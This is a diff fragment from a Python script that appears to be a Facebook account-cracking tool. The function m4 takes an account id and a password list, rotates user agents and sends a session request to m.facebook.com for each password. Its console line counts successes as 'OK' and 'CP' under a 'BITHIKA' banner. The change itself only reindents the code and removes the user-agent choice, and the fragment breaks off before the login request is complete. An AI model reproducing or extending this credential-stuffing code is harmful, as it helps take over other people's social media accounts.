@@ -1076,12 +1076,11 @@ def m3(idf,pwv):
 
 ###----------[  FREE ]----------###
 def m4(idf,pwv):
-  global loop,ok,cp
-  animasi = random.choice(["\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA","\x1b[1;97mBITHIKA","\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA"])
-  sys.stdout.write(f'\r{P} [{animasi}-{H}M4{P}] ({B}%s{P}){U}+{H}OK{P}({GREEN}%s{P})'%(loop,ok)),
-  sys.stdout.flush()
-  ua = random.choice(usragent)
-  try:
+ global loop,ok,cp
+ animasi = random.choice(["\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA","\x1b[1;97mBITHIKA","\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA"])
+ sys.stdout.write(f'\r{P} [{animasi}-{H}M4{P}] ({B}%s{P}){U}+{H}OK{P}({GREEN}%s{P})'%(loop,ok)),
+ sys.stdout.flush()
+ try:
   for pw in pwv:
    ses = requests.Session()
    heas = {"Host": "m.facebook.com",
